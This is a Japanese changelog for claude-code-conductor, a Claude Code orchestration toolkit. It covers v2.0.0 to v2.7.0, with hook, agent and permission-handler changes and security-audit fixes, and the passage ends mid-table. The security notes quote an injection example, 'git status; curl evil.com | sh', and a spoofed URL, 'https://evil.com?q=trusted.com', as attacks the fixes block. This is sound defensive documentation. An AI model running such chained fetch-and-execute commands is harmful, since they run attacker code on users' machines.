- **18 サイクルのコードレビュー + セキュリティレビューを実施**: High / Critical / Medium すべて 0 件で確定。各サイクルのレポートは `.claude/reports/{code,security}-review-report-*.md` に記録

---

## [2.7.0] - 2026-05-16

### 概要

Stop hook の background agent 化・permission_handler へのボタン付き通知追加・worktree 並列実行の取り込み修正など、オーケストレーション基盤の品質を大幅に向上。あわせて security-audit フルサイクルによる定期監査を実施し、セキュリティ・品質指摘 7 件を修正した。

### 追加

- **`summarize-memory` を skill から agent へ移行** (`.claude/agents/summarize-memory.md`): `Agent(run_in_background=True)` による非同期実行に変更。Stop hook が LLM 要約をブロッキングなしで起動できるようになった
- **`permission_handler` にボタン付きトースト通知を追加** (`.claude/hooks/permission_handler_toast.py`): windows-toasts（optional-dependency）で「自動承認に追加: `Bash(...*)`」ワンクリック追記を実装。`permission_rules.json` の手動編集が不要になった
- **`auto_allow` リストに上限 100 件を設定** [SR-K-003]: 意図しないパターン混入リスクを抑制するサイズ制限を追加

### 修正

- **Stop hook を timestamp 比較 + background agent 化** (`.claude/hooks/session_stop.py`): `claude -p` サブプロセスを廃止し `exit 2 + stderr` で Claude に agent 起動を指示する方式へ移行。クールダウン廃止により mtime 比較で要約の必要性を機械判定するシンプルな設計に統一
- **並列実行時の worktree ファイル取り込みを構造的に修正** (`.claude/hooks/worktree_guard.py`、`.claude/skills/parallel-agents/SKILL.md`): `git check-ignore -q` による分岐ハイブリッド retrieval に統一。worktree 外への Write/Edit を `exit 2` でブロックする保護を CWD ベース自動有効化に変更

### 修正（security-audit 定期監査）

- **[CR-NEW] `consolidate_memory.write_summary()` をアトミック書き込みに統一**: 同ファイル内 `write_promotion_candidates_log` と同じ `_atomic_write()` 経由に変更し、Stop hook 競合時のファイル破損リスクを排除
- **[CR-CC-002] `session_stop._needs_summary()` の TOCTOU 耐性を追加**: `os.path.getmtime()` を個別 `try/except OSError` でラップし、`listdir` と `getmtime` の間にファイルが削除されても例外が伝播しないよう修正
- **[CR-Q-001] `permission_handler.suggest_pattern()` に設計メモを追記**: `_SHELL_INJECTION_RE` フィルタが `matches_pattern()` 内でも再適用される二重防御の説明を docstring に追記
- **[CR-Q-005] `permission_handler_toast.py` の未使用 `import time` を削除**
- **[SR-V-001] `worktree_guard.py` の CWD 判定をコンポーネント分割方式に変更**: `cwd.split(os.sep)` で `.claude` → `worktrees` の連続を検査するよう変更し、symlink 経由の guard 無効化リスクを低減
- **[CR-NEW] `parallel-agents/SKILL.md` の `session_utils` パスを修正**: `--hooks-dir` オプション削除後に動作しなくなっていたサンプルコードを `(cd .claude/hooks && python -c "...")` 形式に修正

---

## [2.6.1] - 2026-05-15

### 概要

security-audit による定期監査の結果をフィックス。セキュリティ強化 3 件・コード品質修正 14 件を適用。API 変更なし。

### 修正（セキュリティ）

- **[SR-INJ-002] `permission_handler.py` Windows 通知を Base64 EncodedCommand 化**: `safe_msg` を f-string に直接埋め込んでいた方式を廃止し、`base64.b64encode` で変換してから `-EncodedCommand` に渡すよう変更。`'` / バッククォート / `$` を含むメッセージでもインジェクション不可能になった
- **[SR-AI-001] `consolidate_memory.py` LLM 子プロセスの攻撃面縮小**: `_escape_for_xml` に引用符エスケープ（`"` → `&quot;`、`'` → `&#39;`）を追加。claude 子プロセスの `--dangerously-skip-permissions` を除去し `--tools ""` で全ツール無効化
- **[SR-V-001] `select_tier.py` prompt_prefix の秘密情報マスク**: プロンプト先頭 200 文字を `.claude/logs/prompt-history.jsonl` に保存する前に、API キー・トークン・パスワード相当の 7 パターンを `***` でマスク

### 修正

- **[CR-Q-004] `db.py` / `cli_tier.py` `_BUSY_TIMEOUT_MS` を SSOT に統一**: `db.py` を SSOT として `cli_tier.py` の独立定義を削除。`read_recent_outcomes` ヘルパーを `db.py` に追加し `sqlite3.connect` 直接呼び出しを廃止
- **[CR-M-002] `LEARNING_THRESHOLD` を `db.py` SSOT に統一**: `cli_tier.py` と `select_tier.py` の独立定義を削除。フックのスタンドアロン制約に対応するため `select_tier.py` はダイナミックインポート + フォールバック方式を採用
- **[CR-M-001] `restore_session.py` の重複 `extract_section` を削除**: `session_utils.extract_section` をダイナミックインポートで参照し、内製実装を削除
- **[CR-E-003] `review_hint_inject.py` レポート書き込みをアトミック化**: `write_text` を `tempfile.mkstemp` + `os.replace` パターンに変更し、書き込み途中での中断によるファイル破損を防止
- **[CR-T-001] `mcp_server.py` `_elicit` に `json.JSONDecodeError` ハンドリング追加**: 不正 JSON 行を受信してもメソッドが例外で終了せず、ログ出力してスキップしてループ継続するよう修正
- **[CR-CT-001] `question.py` `load_questions` の型分岐を明示化**: `isinstance(source, dict)` → `isinstance(source, (str, Path))` → `TypeError` の順に明示化し、`Path(str(dict))` の duck typing を排除
- **[CR-N-004] `stop.py` `_parse_session_date` の `None` 返却化**: `date.min` センチネル値から `None` 返却に変更し意図を明示。呼び出し元 `count_sessions_since` に `None` フィルタを追加
- **[CR-Q-002] `consolidate_memory.py` `build_summary_markdown` の today 型統一**: 関数冒頭で `datetime` 型に正規化し、`date` 型で `timespec` 引数が例外になるパスを排除
- **[CR-M-003] `select_tier.py` `maybe_escalate` の引数上書きを解消**: `_db_failure_rate` をモジュールトップレベルへ抽出し、`effective_fn = failure_rate_fn or _db_failure_rate` で参照
- **[CR-Q-005] `review_hint_inject.py` 空関数呼び出し削除**: `_ensure_c3_db_path_in_sys_path()` の呼び出しを削除（c3 パッケージは常にインストール済みのため不要）
- **[CR-M-003] `adapters.py` `_dev_source_pythonpath` に docstring 追加**
- **[CR-Q-007] `post_tool.py` print パターンスコープのコメント追加**

### セキュリティ告知（環境依存）

`pip <= 26.0.1` および `urllib3 <= 2.6.3` に既知脆弱性（CVE-2026-3219 / CVE-2026-6357 / CVE-2026-44431 / CVE-2026-44432）が報告されています。C3 パッケージ自体の直接依存ではありませんが、利用環境で `pip install --upgrade pip urllib3` の実行を推奨します。

---

## [2.6.0] - 2026-05-15

### 概要

Codex CLI との連携スキル `codex-review` を新設。Codex を code-reviewer / security-reviewer ペルソナとして動かし、Claude とは異なる視点でのレビューを可能にする。あわせて Codex と Claude の並列レビューで発見されたセキュリティ問題を `permission_handler.py` と `cli_ask.py` に対して修正した。

### 追加

#### `codex-review` スキル新設 (`.claude/skills/codex-review/`)

Codex CLI（`codex exec`）に `.codex/agents/` のエージェント定義を読み込ませ、code-reviewer または security-reviewer のペルソナとしてレビューを実行する新スキル。C3 Codex アダプター（`c3 init --platform codex`）がセットアップ済みの場合のみ有効。

- **単一ファイルモード**: 指定ファイルを Codex でレビューし `.claude/reports/` にレポートを保存
- **ワークフローモード** (`workflow code-reviewer` / `workflow security-reviewer`): `git diff HEAD` の変更差分全体を対象にレビュー。通常ワークフローの Claude レビューと並走させる用途を想定
- `.codex/agents/{reviewer_type}.toml` の定義をプロンプトに埋め込み、Codex がサブエージェント起動なしに直接ペルソナとして動作
- レポートは `[CR-XX-NNN]` / `[SR-XX-NNN]` 形式で出力し、通常の C3 レビューと同じ契約を維持

### 修正（セキュリティ）

#### `permission_handler.py` のセキュリティ強化 (`.claude/hooks/permission_handler.py`)

Claude と Codex の並列レビューで検出された脆弱性を修正。

- **Bash シェルコマンドチェーニングの防止**: `Bash(git *)` 等の auto-allow パターンで `;` `&&` `||` バッククォート `$()` を含むコマンドが自動承認されてしまう問題を修正。`git status; curl evil.com | sh` のような注入を防ぐ
- **WebFetch ドメイン判定の厳密化**: `domain in url` の部分一致を `urlparse().hostname` による完全一致・サブドメイン一致に変更。`https://evil.com?q=trusted.com` のような URL 偽装を防ぐ
- **Windows 通知の PowerShell インジェクション対策**: `-Command` を `-EncodedCommand`（Base64）に変更しシェル展開を完全排除
- **macOS 通知の改行エスケープ**: `message` 内の改行を AppleScript に渡す前にスペースへ置換
- **`tool_input` 型チェック追加**: dict 以外が来た場合の `{}` フォールバックを追加
- 上記すべてに対してテストを追加（40件 → 計40件、新規11件）

### 修正

#### `cli_ask.py` のバグ修正 (`src/c3/cli_ask.py`)

Codex によるコードレビューで検出された問題を修正。

- **非対話モードでの暗黙デフォルト選択を防止**: `--response` 未指定 + 非対話環境（CI/エージェント実行）で必須質問の先頭選択肢が静かに自動選択されていた問題を修正。エラーメッセージを出して終了するよう変更
- **`--json` のファイルパス混同を防止**: `--json` に渡した文字列が既存ファイル名と一致した場合にファイルとして読まれる問題を修正。`handle()` 内で `json.loads()` して dict に変換してから `load_questions()` へ渡すよう変更
- **`EOFError` / `KeyboardInterrupt` の捕捉**: パイプ切断・Ctrl+C でトレースバックが出る問題を修正（`EOFError` → exit 1、`KeyboardInterrupt` → exit 130）
- **`json.JSONDecodeError` の重複削除**: `ValueError` のサブクラスのため `except` 句から除去

---

## [2.5.0] - 2026-05-13

### 概要

`/start` スキルのルーティング停止バグを修正し、ステータスラインの表示をリニューアル。

### 修正

#### `/start` → `task-routing` の種別返却が停止するバグ修正

`/start` コマンド実行後 task-routing でタスク種別を選択すると「/start コマンドへ移行」というメッセージが出力されるだけで止まり、ユーザーが再度 `/start` を手入力しなければならない問題を修正。

- `task-routing/SKILL.md`: `from_start=true` モード終了時に「確定した種別名を1行のみ出力して終了する」ことを明示。「/start へ移行します」などの余剰メッセージを **絶対に出力しない** 旨を追記
- `start/SKILL.md`: Skill 呼び出し完了後は追加メッセージなしに即 Step 0.5-D へ進む旨と、種別取得失敗時の再呼び出しフォールバックを追記
- 3箇所の防御的冗長記述にクロスリファレンスを追加（LLMのコンテキスト読み飛ばし対策のため意図的な反復であることを明示）

### 変更

#### ステータスライン表示のリニューアル (`.claude/hooks/statusline.py`)

表示フォーマットを以下に刷新:

```
[Claude Sonnet 4] 200K high | ctx used 8% | 5h lim 24% (1h 59m) | 7d lim 41% (2d 23h)
```

- モデル名・コンテキストサイズ・effort レベルを先頭にスペース区切りで追加
- コンテキストサイズを `200K` / `1M` 形式に変換して表示
- ゲージバー（`[████░░░░░░]`）を廃止してテキストのみに変更
- `context usage` → `ctx used`、`lmt` → `lim`（標準的な英語略語）に表記統一
- `|` 区切りの前後にスペースを追加
- レート制限のリセット残り時間を `(Xh Ym)` / `(Xd Yh)` 形式で括弧付き表示
- `rate_limits` 未取得時は該当項目を省略

---

## [2.4.0] - 2026-05-12

### 概要

Codex / Cursor adapter 追加（v2.3.0 系列）の整合性監査の結果見つかった問題を一括修正。MCP server の path traversal を symlink 経由まで防御し、adapter 内部関数のユニットテストを 22 ケース新設。Claude Code 専用機能の Codex/Cursor 読み替えを `taxonomy.md` と新規 `platform-adapters.md` で明示し、CRLF/LF の取り扱いを `.gitattributes` で固定化した。

### 変更（セキュリティ強化）

#### MCP `_read_skill` の path traversal 防御強化 (M2)

`src/c3/mcp_server.py:_read_skill` を以下のように変更:

- `.` / `..` の文字列マッチに加え、`Path.resolve(strict=True)` で symlink を解決
- 解決後のパスが `.claude/skills/` 配下にあるかを `skills_root in resolved.parents` で検証
- 範囲外の場合は `None` を返す（エラー出さずサイレントに拒否）

これにより悪意ある symlink を `.claude/skills/<name>/SKILL.md` として配置しても、project_root 外のファイルが読まれなくなる。脅威モデル: 悪意あるリポジトリを clone した利用者を巻き込むシナリオ。

### 変更（ドキュメント / 整合性）

#### Codex / Cursor 動作差分の明文化 (H3, M3, M4)

3 つのドキュメントを更新:

- **`.claude/CLAUDE.md`**: `Platform Compatibility` セクション追加。`AskUserQuestion` / `Agent` / `Skill` / agent フロントマターの Codex/Cursor 読み替え方針を整理
- **`.claude/docs/taxonomy.md`**: agents セクション末尾に「Codex / Cursor での扱い」表を追加。`permissionMode` / `isolation` / `hooks` 等の Claude Code 専用キーの取り扱いを記述。memory スコープ表に運用ルール（配布除外・書き込みタイミング・手動編集・削除）を追加 (L3)
- **`.claude/docs/platform-adapters.md`** (新規): `c3 init --platform` の選択肢、生成物、MCP server (`c3_ask_user_question` / `c3_list_skills` / `c3_read_skill`)、`c3 ask` CLI fallback、managed block の仕様、動作差分マトリックスを 1 ファイルでまとめた利用先向け技術文書

#### README に PO 撤去履歴を明示 (L4)

`並列実行 (parallel-agents skill)` セクションに v2.0.0 で PO (Parallel Orchestra) 完全撤去された旨を追記。利用先で「PO」「外部プロセス」という単語が CHANGELOG に登場する理由を新規ユーザーが追跡できるようにした。

### 変更（テスト追加）

#### `tests/test_adapters.py` 新設 (M1, L1)

`src/c3/adapters.py` の内部関数と MCP `_read_skill` をカバーする 23 ケース（うち 1 ケースは Windows で skip）を追加:

- `_toml_escape` / `_toml_multiline_escape` のエッジケース（backslash, quote, triple quote, 改行保持）
- `_convert_skill` の frontmatter あり/なし/heading なしの分岐
- `_codex_agent_toml` の特殊文字・改行保持
- `_replace_managed_block` の単一/複数 block ケース（`count=1` 契約を回帰防止）
- `_write_cursor_mcp` の merge / 新規作成 / 不正 JSON 拒否 / 非 object 拒否
- `scaffold_adapters` の `.claude/` 不在エラー / 冪等性
- MCP `_read_skill` の正常系 / `..` 拒否 / 空文字拒否 / 不在 / symlink 経由のアクセス拒否 (POSIX 限定)

### 変更（環境整理）

#### `.gitignore` に adapter 生成物追加 (H2)

`c3 init --platform codex|cursor|all` で生成される `/AGENTS.md` / `/.codex/` / `/.cursor/` / `/.agents/` を配布元リポジトリでの git commit 混入から保護。wheel 同梱は `src/c3/_template/.claude/` 配下に限定されるため構造的に wheel には入らないが、開発者が adapter を試生成した時の事故防止のため明示除外。

#### `.gitattributes` 拡張 (M5)

`*.toml` / `*.mdc` を `text eol=lf` に。さらに `AGENTS.md` / `.codex/**/*` / `.cursor/**/*` も `eol=lf` で固定。Windows の `core.autocrlf=true` 環境でも adapter ファイルが CRLF 化されず、`_write_file_if_changed` の完全一致比較が安定する。

#### `.claude/settings.local.json` の PO 遺物削除 (H1)

`Bash(c3 po *)` と `python -m pytest tests/parallel_orchestra/...` の許可ルールを削除。`c3 po` コマンドと parallel_orchestra テストは v2.0.0 で撤去済みのため、これらルールは空回りしていた。

### 削除

なし（破壊的変更なし）。

### 互換性

- v2.3.x からの後方互換: **完全互換**（API 変更なし、振る舞い変更なし、削除なし）
- adapter 生成ファイル: 改行コードが CRLF だった環境では LF に正規化される。`git diff` 上で改行差が出るが内容差はない
- セキュリティ修正: MCP `_read_skill` の戻り値挙動が **拒否時に `None`** で変わらず。symlink を悪用していたケース（通常用途では存在しない）のみ拒否される

### 検証

- 全テスト: 613 passed / 3 skipped (Windows 環境)
- wheel build: `claude_code_conductor-2.4.0-py3-none-any.whl` (81 entries) — adapter 生成物 (`.codex/` / `.cursor/` / `.agents/` / `AGENTS.md`) の混入なし、機密ファイル混入なし、新規 `platform-adapters.md` は配布対象に含まれる
- `c3 doctor`: 全項目 OK

---

## [2.3.0] - 2026-05-12

### 概要

PO（Parallel Orchestra）完全廃止後の DX 整理リリース。配布先ユーザーが意味を理解できなかった内部 ID（`F-XXX`）を機能名に全置換し、並列専用 wt_* agent 3 つのレポート出力規約を `task_id` ベースで統一。さらに、PO 関連の死蔵ディレクトリ・skill 内の歴史的経緯記述を一掃した。

### 変更

#### 内部 ID `F-XXX` を機能名へ全置換（DX 改善）

`.claude/docs/c3追加予定機能リスト.md` は `.gitignore` 対象のため、配布先ユーザーが `F-001` 等のコードの意味を解読できない問題があった。全 32 ファイル 146 箇所を以下のマッピングで置換:

| 旧 ID | 新名称 |
|---|---|
| F-001 | `review-hint` |
| F-002 | `po-sqlite` (廃止済み) |
| F-003 | `po-status` (廃止済み) |
| F-004 | `memory-consolidation` |
| F-005 | `tier-routing` |
| F-006 | `secret-scan` |
| F-007 | `post-edit-scan` |
| F-008 | `subagent-metrics` |
| F-009 | `duckdb-hybrid` |
| F-010 | `task-routing` |

ユーザー目視メッセージ（UserPromptSubmit hook の `[F-005 Tier 推奨]`）も `[tier-routing 推奨]` に変更。CHANGELOG.md は歴史的記録として F-XXX を保持。

#### code-reviewer / security-reviewer に `[CR-NEW]` / `[SR-NEW]` マーカー追加

チェックリスト未収載の指摘を強引に既存 ID へマッピングする問題を回避するため、該当 ID がない指摘を `[CR-NEW]` / `[SR-NEW]` で出すルールを追加。`review-hint` (旧 F-001) の照合精度を保ち、チェックリストの成長候補として扱える。

#### 並列 wt_* agent 3 つの task_id ベース出力統一

`parallel-agents` skill 経由で並列起動される 3 つの worktree 専用 agent (`wt_tester` / `wt_developer` / `wt_systematic-debugger`) のレポート出力規約を統一:

| Agent | 主経路 | 保険経路 |
|---|---|---|
| wt_tester | `test-report-{task_id}.md` | `test-report-{timestamp}.md` |
| wt_developer (Stuck Signal) | `debug-needed-{task_id}.md` | `debug-needed-{timestamp}.md` |
| wt_systematic-debugger | `debug-analysis-{task_id}.md` | `debug-analysis-{timestamp}.md` |

`parallel-agents/SKILL.md` の prompt 注入にも systematic-debugger 用注入を追加（従来は tester のみ）。これにより `plan-report` の `writes` 宣言と実出力ファイル名の不一致による取り込み破綻リスクを解消。

#### tester / wt_tester の重複指示削除

`Workflow After` と `Tools & Constraints` の `必須:` 行で同内容のレポート出力指示が重複していたのを After 側に一本化。

#### skill ファイルから歴史的経緯記述を削除

`develop/SKILL.md` の「移行注意（v1.12.0+）」セクションと `parallel-agents/SKILL.md` 末尾の「PO 廃止移行期の注意（v1.12.0〜v2.2.0）」セクションを削除。SKILL ファイルは LLM の操作手順書であり、変遷情報は CHANGELOG.md に集約する方針に統一。

### 削除（死蔵ディレクトリ整理）

PO 廃止に伴い不要になったディレクトリを物理削除（いずれも git 追跡外）:

| パス | 状態 |
|---|---|
| `.po-worktrees/` | 空ディレクトリ |
| `examples/` | PO 検証用 task_manager のみ含む sandbox |
| `src/c3/po/` | `__pycache__/` のみ（v1.14.0 で削除済みパッケージの残骸） |
| `src/parallel_orchestra/` | `__pycache__/` のみ（v2.0.0 で削除済みパッケージの残骸） |
| `tests/parallel_orchestra/` | `__pycache__/` のみ |

`.gitignore` から `examples/` エントリも削除（対応するディレクトリが存在しないため）。

### 互換性

- 利用先の plan-report YAML 仕様は無変更
- 既存 plan-report の `agent: tester` / `agent: developer` 表記はそのまま動作（parallel-agents skill 内でマッピング）
- ユーザー向けメッセージのプレフィックスのみ変更（`[F-005 Tier 推奨]` → `[tier-routing 推奨]`）
- SemVer minor: 機能追加と整理のみ、破壊的変更なし

### 利用先での対応

```bash
pip install --upgrade claude-code-conductor
c3 update
```

`c3 update` で `.claude/` 配下の agent / skill / hook が最新版に更新される。配布物の削除は `c3 update` では検出されないが、本リリースは新規追加・変更のみで配布物削除はないため手動クリーンアップは不要。

### 検証

- `pytest -x` 572 passed / 2 skipped
- wheel 再ビルドで `_template/` 内の F-XXX 参照 0 件を確認

---

## [2.2.0] - 2026-05-12

### 概要

並列サブエージェントが Bash / Write の permission チェックで詰まる問題を解決するリリース。

`parallel-agents` skill が `run_in_background: true` で並列起動する子サブエージェントは、公式仕様により「起動前に承認した permission のみ実行可、それ以外は auto-deny」という制約を受ける。任意のテスト・ビルドコマンドは事前承認できず、実行中に詰まっていた。

**根本原因**: v2.1.0 までの skill は `subagent_type` を指定せず prompt 内で「.claude/agents/{name}.md を Read してペルソナ採用」と指示していた。これは built-in `general-purpose` subagent を起動し、agent frontmatter の `permissionMode` が読まれない設計だった。

**修正**: 並列 worktree 専用の `wt_*` プレフィックス agent を新設し、`subagent_type` 明示指定 + worktree 限定で安全な `bypassPermissions` を実現。

### 新規追加

| パス | 内容 |
|---|---|
| `.claude/agents/wt_tester.md` | 並列 worktree 専用 tester。frontmatter に `permissionMode: bypassPermissions`。本文は tester.md と同一 |
| `.claude/agents/wt_developer.md` | 並列 worktree 専用 developer。同上 |
| `.claude/agents/wt_systematic-debugger.md` | 並列 worktree 専用 systematic-debugger。同上 |

### 変更

#### code-reviewer / security-reviewer
- frontmatter に `permissionMode: bypassPermissions` 追加。Read 中心でソース編集なし（プロンプトで明記）のため、wt_ プレフィックスなしで元 agent に直接付与

#### parallel-agents skill
- depth 1 制限テーブルの「カスタム agent は subagent_type 不可」記述を訂正（公式仕様では指定可能）
- 「subagent_type 明示指定と wt_* 名前空間」セクションを新設
- 2-A wave 内容提示テーブルに「起動する subagent_type」列を追加（`wt_*` への変換を明示）
- 2-C: `subagent_type: 指定しない` → `subagent_type: <wt_name>` 明示指定に変更
- prompt から「Step 1: agents/{name}.md を Read してペルソナ採用」指示を削除（subagent_type で自動適用）
- マッピング表追加（plan-report の agent 名 → 実際の subagent_type）

#### planner.md
- TDD 3-wave 設計指針の agent 名を `wt_tester` / `wt_developer` に更新
- v2.2.0 注記を追加（並列実行では wt_*、直接起動では元 agent を使う旨）

### 安全性

| 起動経路 | isolation | 使用される agent | 結果 |
|---|---|---|---|
| `parallel-agents` skill (並列 wave) | `"worktree"` 付き | `wt_*` (`wt_tester` / `wt_developer` / `wt_systematic-debugger`) | worktree 内のみ。`worktree_guard.py` (PreToolUse, `PO_WORKTREE_GUARD=1`) が main への書き込みブロック。安全 |
| dev-workflow フェーズ D-1〜D-5 (単発 TDD) | なし | `tester` / `developer` (元 agent) | default mode。main で permission プロンプトあり。安全 |
| security-audit (parallel-reviewer) | なし | `code-reviewer` / `security-reviewer` | bypassPermissions 付きだが Write は `.claude/reports/` のみ（プロンプトで「ソース編集不可」明記）、Bash も grep/log 系で実害低 |

公式 circuit breaker (`rm -rf /` / `rm -rf ~` プロンプト) は引き続き全モードで機能する。

### 移行ガイド

利用先での対応:
1. `pip install --upgrade claude-code-conductor`
2. `c3 update` を実行 → `wt_tester.md` / `wt_developer.md` / `wt_systematic-debugger.md` が追加配布される
3. 既存 plan-report は変更不要（`agent: tester` / `agent: developer` のまま動く。parallel-agents skill 内でマッピング）。ただし planner が新規生成する plan-report は `agent: wt_tester` 等の直接指定も推奨

### 互換性

- 利用先の plan-report YAML 仕様は無変更
- 旧 agent (`tester` / `developer` / `systematic-debugger`) も維持。直接起動経路で使用継続
- SemVer minor: 機能追加のみ（破壊的変更なし）

### 検証

- `pytest -x` 572 passed / 2 skipped
- wheel に `wt_tester.md` / `wt_developer.md` / `wt_systematic-debugger.md` のエントリが含まれること

---

## [2.1.0] - 2026-05-12

### 概要

v2.0.0 直後の機能整理リリース。**`tdd-develop` agent と `worktree-tdd-workflow` skill を廃止**し、TDD を planner が **3-wave（Red tester 並列 → Green developer 並列 → Green 確認 tester 並列）に分解する**設計に統一した。これにより depth 1 制限で逐次実行に縛られていた TDD タスクが独立機能間で完全並列化される。

v2.0.0 で残っていた PO / `wave-execution` / `c3 po` 言及の移行漏れ（`task-routing` / `start` / `dev-workflow` / `develop` / `promote-pattern` 各 skill、`docs/skills.md` / `docs/cli-reference.md` / `docs/index.md` / `docs/getting-started.md` / `README.md`、`worktree_guard.py` / `session_utils.py` の docstring）も併せて修正した。

### 削除（minor、利用先での手動 cleanup 必要）

| パス | 代替 |
|---|---|
| `.claude/agents/tdd-develop.md` | planner が 3-wave に分解して `tester` / `developer` を並列起動 |
| `.claude/skills/worktree-tdd-workflow/SKILL.md` | `parallel-agents` skill が直接 tester / developer を起動 |

### 変更

#### planner エージェント
- 「並列実行のための設計指針」を 3-wave 分解指針に書き換え（旧ルール「TDD は 1 タスクにまとめる」を削除）
- 命名規約 `test-` / `impl-` / `confirm-` を推奨（強制ではない）
- `writes` の test-report ファイル名は `.claude/reports/test-report-{task_id}.md` のように task_id ベースを推奨
- depth 1 制限の tdd-develop 言及を削除
- R1 自動検査の説明を削除（hook 本体も削除）

#### parallel-agents skill
- depth 1 制限テーブルから tdd-develop 行削除し、全 agent 並列起動可能になった旨を明記
- 「2-C-1 tdd-develop ペルソナ採用」ブロック削除し、並列起動を単一手順に統合
- tester / developer 向けのプロンプト注入を強化

#### 自動検査 hook（配布元）
- `.dev/hooks/_planner_check.py`: R1（tdd-develop writes 検査）を削除。R2/R3/R4 は維持
- `tests/hooks/test_planner_check.py`: R1 系テストクラスを削除、R3 テストの tdd-develop 依存を除去

#### 配布除外（3 ファイル同期）
- `src/c3/_excludes.py` / `hatch_build.py` / `.gitignore` に `agents/tdd-develop.md` と `skills/worktree-tdd-workflow/*` を追加

#### v2.0.0 移行漏れの hotfix
- `task-routing/SKILL.md`: refactor 編成の `c3 po run` / PO 推奨を `parallel-agents` skill に置換、`wave-execution` 参照を更新、tdd-develop 行削除、feature の TDD 表記を 3-wave に更新
- `start/SKILL.md`: PO 並列実行 / wave-execution.md 参照を `parallel-agents` に置換
- `dev-workflow/SKILL.md`: description / 本文の `wave-execution` 参照を `parallel-agents` に修正、tdd-develop 言及削除
- `develop/SKILL.md`: PO 廃止履歴と v2.1.0 の tdd-develop 廃止を追記
- `promote-pattern/SKILL.md`: description 例文の tdd-develop 言及を別例に差し替え
- `worktree_guard.py` / `session_utils.py`: docstring から tdd-develop / wave-execution 言及を更新
- `docs/skills.md` / `docs/cli-reference.md` / `docs/index.md` / `docs/getting-started.md` / `README.md`: PO / wave-execution / tdd-develop / `c3 po` の陳腐化記述を削除・修正

### 移行ガイド

#### 利用先プロジェクトでの手動 cleanup

`c3 update` は **ファイル削除を検出しない**ため、利用先で以下を手動実行する:

```bash
rm -f .claude/agents/tdd-develop.md
rm -rf .claude/skills/worktree-tdd-workflow
```

#### 既存 plan-report の書き換え

`agent: tdd-develop` を含む plan-report は `c3 plan validate` が `agent file not found` で失敗するため、以下のように 3 タスクに展開する:

**Before（v2.0.0）:**
```yaml
tasks:
  - id: tdd-login
    agent: tdd-develop
    writes:
      - tests/auth/test_login.py
      - src/auth/login.py
      - .claude/reports/test-report-tdd-login.md
    prompt: "ログイン機能を TDD で実装する"
```

**After（v2.1.0+）:**
```yaml
tasks:
  - id: test-login
    agent: tester
    writes:
      - tests/auth/test_login.py
      - .claude/reports/test-report-test-login.md
    prompt: |
      Red フェーズ。ログイン機能の失敗テストを書き、機能未実装で正しく失敗することを確認する。
      writes 宣言と一致するファイル名で test-report を Write すること。
  - id: impl-login
    agent: developer
    depends_on: [test-login]
    writes:
      - src/auth/login.py
    prompt: |
      Green フェーズ。test-login の test-report の不合格テストを通す最小実装を行う。
      テストコードは編集しない。
  - id: confirm-login
    agent: tester
    depends_on: [impl-login]
    writes:
      - .claude/reports/test-report-confirm-login.md
    prompt: |
      Green 確認。全テストを実行して合格を確認する。
      writes 宣言と一致するファイル名で test-report を Write すること。
```

3-wave 化により、独立した複数機能（auth / payment 等）の Red を 1 wave で並列起動できる。

#### Green wave 失敗時の運用

`impl-*` タスクが失敗した場合は `parallel-agents` skill の 2-E（リトライ / スキップ / 中断）で吸収する。developer 内の Stuck Signal（`.claude/reports/debug-needed-*.md` 出力）は引き続き機能する。リトライ時に親 Claude が後続 wave で `systematic-debugger` を呼ぶ運用に統一。

### LTS / 互換性

- v1.x からのアップグレードは引き続き v2.0.0 経由で行う（v1.x → v2.1.0 直接は未検証）
- v2.0.x 系を維持したい場合は `pip install "claude-code-conductor>=2.0,<2.1"`
- SemVer minor: agent / skill 削除はあるが、利用先 API（CLI / Python import）は無変更

### 検証

- `pytest -x` 572 passed / 2 skipped
- wheel に `agents/tdd-develop.md` / `skills/worktree-tdd-workflow/` のエントリ 0 件
- `_planner_check.py` が 3-wave plan-report に対して R1 警告を出さない（R1 自体が削除されている）

---

## [2.0.0] - 2026-05-12

### 概要（互換破壊リリース）

PO（Parallel Orchestra）段階的廃止計画の **Step 5（最終）**。`parallel_orchestra` パッケージ本体を削除し、PO 関連の全アセット（hook / docs / DB テーブル定義 / console script / planner ドキュメント言及）を取り除いた。

**本リリースは v1.x との互換性を保証しない**。v1.x で `parallel-orchestra` console script や `from parallel_orchestra import ...` を直接使っていた外部コードは動作しなくなる。利用先テンプレートからも PO 関連スキル・hook が消える。

### 廃止計画 全体サマリ

| Step | Version | 内容 |
|---|---|---|
| 1 | v1.11.0 | `parallel_orchestra.c3_db` を `c3.db` に物理移動（非破壊） |
| 1.5 | v1.11.1 | `docs/codex対応/` 配布除外 hotfix |
| 2 | v1.12.0 | 新 skill `parallel-agents` 追加、`develop` 参照先切替、`wave-execution` deprecated 化 |
| 3 | v1.13.0 | `po-status` skill / `c3 status` CLI 削除 |
| 4 | v1.14.0 | `c3 po` CLI / `src/c3/po/` / `wave-execution` skill 削除、`c3 plan` 新設 |
| **5** | **v2.0.0** | **`parallel_orchestra` パッケージ削除、関連アセット全削除** |

廃止の根拠は 2026-05-11 の PoC で「並列 subagent 起動時の permission チェッカー race」（前身 Clade v1.19.0 で発見、PO 導入の主因）が Claude Code 本体で構造的に修正されたことを確認したこと（15 並列・101 tool 呼び出しで失敗 0 件）。詳細は `feedback_parallel_subagent_race_resolved.md` を参照。

### 削除（互換破壊）

#### Python パッケージ
| パス | LOC | 用途 |
|---|---|---|
| `src/parallel_orchestra/__init__.py` / `_exceptions.py` / `cli.py` / `manifest.py` / `report.py` / `runner.py` | ~3,000 | PO 本体（runner / heartbeat / auto-merge / dashboard 含む） |
| `tests/parallel_orchestra/` (16 ファイル) | ~2,000 | PO 単体テスト |

#### console script
- `parallel-orchestra = "parallel_orchestra.cli:main"` を `pyproject.toml` から削除

#### Hook / Docs
| パス | 理由 |
|---|---|
| `.claude/hooks/po_heartbeat.py` | PO 進捗 heartbeat hook（PO 廃止により呼び出し元消失） |
| `.claude/docs/parallel-orchestra-manifest.md` / `po-worktree-writes.md` | PO 仕様ドキュメント |

#### DB スキーマ
| 対象 | 変更 |
|---|---|
| `po_results` / `po_status` テーブル | `schema.sql` から CREATE 文を削除し、`DROP TABLE IF EXISTS` マイグレーションを追加。利用先で次回 session-start hook 実行時に自動 DROP |
| `SCHEMA_VERSION` | 2 → 3 にバンプ |

#### コード内 PO 連動コード
| ファイル | 削除内容 |
|---|---|
